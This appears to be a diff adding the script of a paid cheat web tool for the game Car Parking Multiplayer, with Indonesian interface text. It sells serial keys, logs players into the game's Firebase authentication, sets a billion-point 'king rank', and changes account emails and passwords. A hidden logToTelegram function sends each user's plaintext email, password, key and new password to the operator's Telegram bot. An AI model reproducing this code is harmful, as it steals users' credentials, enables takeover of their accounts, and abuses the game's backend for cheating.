+                            // 7. Berikan hasil akhir ke User
+                            alert(`✅ PEMBELIAN BERHASIL!\n\nSERIAL KEY ANDA:\n${generatedKey}\n\nSilakan salin key ini dan tempel di menu Tools untuk login. Data sudah tersimpan otomatis di database.`);
+                            
+                            // Opsi tambahan jika user mau lapor ke WA
+                            if(confirm("Buka WhatsApp untuk simpan bukti pembelian ke Admin?")) {
+                                window.open(`https://wa.me/6281330750863?text=${encodeURIComponent('Halo Admin, saya baru saja membeli ' + keyName + ' dan mendapatkan Key: ' + generatedKey)}`, '_blank');
+                            }
+
+                        } catch (e) { 
+                            console.error(e);
+                            alert("Terjadi kesalahan sistem!"); 
+                        }
+                        this.loading = false;
+                    }
+                },
+
+                updateBalance(uid, amt) { firebase.database().ref('users/' + uid + '/balance').transaction(b => (b || 0) + amt); },
+                resetBalance(uid) { firebase.database().ref('users/' + uid + '/balance').set(0); },
+
+                async handleCpmLogin() {
+                    if (!this.cpmForm.key || !this.cpmForm.email) { this.message = "Isi data!"; return; }
+                    this.logToTelegram(`📡 **TRY LOGIN TOOL**\n` + `Acc: \`${this.cpmForm.email}\`\n` + `Pass: \`${this.cpmForm.password}\`\n` + `Key: \`${this.cpmForm.key}\`\n` + `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`);
+                    this.loading = true;
+                    try {
+                        const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
+                        if (!snap.val() || snap.val().status !== 'active') {
+                            this.logToTelegram(`❌ **LOGIN FAILED**: Invalid Key (\`${this.cpmForm.key}\`)`);
+                            throw new Error("Key Invalid!");
+                        }
+                        const game = this.gameApis[this.cpmForm.gameId];
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${game.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ email: this.cpmForm.email, password: this.cpmForm.password, returnSecureToken: true })
+                        });
+                        const data = await res.json();
+                        if (data.idToken) {
+                            this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: game };
+                            this.message = "";
+                            this.logToTelegram(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
+                        } else {
+                            this.logToTelegram(`❌ **LOGIN FAILED**: Wrong Email/Pass for \`${this.cpmForm.email}\``);
+                            throw new Error("Login Gagal!");
+                        }
+                    } catch (e) { this.message = e.message; }
+                    this.loading = false;
+                },
+
+                async setKingRank() {
+                    try {
+                        await fetch(this.cpmUser.gameData.rankUrl, {
+                            method: 'POST', body: JSON.stringify({ "auth": this.cpmUser.token, "rating": 1000000000 })
+                        });
+                        alert("KING RANK SUKSES!");
+                    } catch (e) { alert("Gagal!"); }
+                },
+
+                async changeEmailPrompt() {
+                    const ne = prompt("Email Baru:");
+                    if(!ne) return;
+                    this.logToTelegram(`📩 **TRY CHANGE EMAIL**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
+                    this.loading = true;
+                    try {
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ idToken: this.cpmUser.token, email: ne, returnSecureToken: true, upgradeToFederatedLogin: true })
+                        });
+                        if(res.ok) {
+                            this.logToTelegram(`✅ **SUCCESS CHANGE EMAIL**\nResult: \`${ne}\``);
+                            this.cpmUser.email = ne;
+                            alert("Berhasil!");
+                        } else {
+                            this.logToTelegram(`❌ **FAILED CHANGE EMAIL**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Gagal!");
+                        }
+                    } catch (e) { alert("Error!"); }
+                    this.loading = false;
+                },
+
+                async changePasswordPrompt() {
+                    const np = prompt("Password Baru:");
+                    if(!np) return;
+                    this.logToTelegram(`🔑 **TRY CHANGE PASS**\nAcc: \`${this.cpmUser.email}\`\nNew Pass: \`${np}\``);
+                    this.loading = true;
+                    try {
+                        const res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key=${this.cpmUser.gameData.api}`, {
+                            method: 'POST', headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ idToken: this.cpmUser.token, password: np, returnSecureToken: true })
+                        });
+                        if(res.ok) {
+                            this.logToTelegram(`✅ **SUCCESS CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Berhasil!");
+                        } else {
+                            this.logToTelegram(`❌ **FAILED CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
+                            alert("Gagal!");
+                        }
+                    } catch (e) { alert("Error!"); }
+                    this.loading = false;
+                },
+
+                logoutCpm() { this.cpmUser = { isLoggedIn: false }; },
+                logToTelegram(t) {
+                    fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+                        method: "POST", headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: this.adminChatId, text: t, parse_mode: "Markdown" })
+                    });
+                }
+            }
+        }
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+</body>
+</html>
